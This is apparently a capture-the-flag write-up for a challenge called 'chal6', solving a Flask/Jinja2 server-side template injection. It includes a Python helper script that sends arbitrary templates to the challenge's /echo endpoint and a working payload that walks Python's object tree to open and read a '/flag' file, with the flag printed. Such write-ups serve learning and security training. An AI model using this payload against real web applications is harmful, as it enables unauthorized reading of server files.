# chal6

## Description

Browsing to the address given in the challenge returns a grabled `pyc` [file](./index.html).

## Analysis

The file is mostly unreadable and of little use in its current form. It should be possible to restore the file to a working state and then decompile it using Python reverse engineering utilities. 

A simpler heuristic approach is also viable. By examining the readable characters one can find the `/echo` endpoint and guess that it accepts an `s` parameter. It is also worth noting that the file includes references to `render_template`, `render_template_string` and `Flask`. This can be used to infer that inputs given to the application will be parsed using the Jinja2 templating engine.

WJinja2 doesn't exactly allow for embedding arbitrary Python expressions but it is possible to [traverse the object tree](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#read-remote-file) to reach useful functions such as `file()`.

## Solution

Using a simple script for executing arbitrary templates helps the process of finding the right input a lot.

```python
#!/usr/bin/env python3
import requests
import sys

r = requests.get(
    "http://45.76.80.234:8082/echo",
    params={"s": "{{%s}}" % sys.argv[1]}
)

print(r.text)
```

For some reason using quoted strings didn't work so a workaround had to be used - the string `/flag` is built from individual bytes.

```
./inject.py "[].__class__.__base__.__subclasses__().pop(40)(config.__class__.__init__.__globals__.__builtins__.chr(47)~config.__class__.__init__.__globals__.__builtins__.chr(102)~config.__class__.__init__.__globals__.__builtins__.chr(108)~config.__class__.__init__.__globals__.__builtins__.chr(97)~config.__class__.__init__.__globals__.__builtins__.chr(103)).read()"
junior-inject_it_like_its_hot
```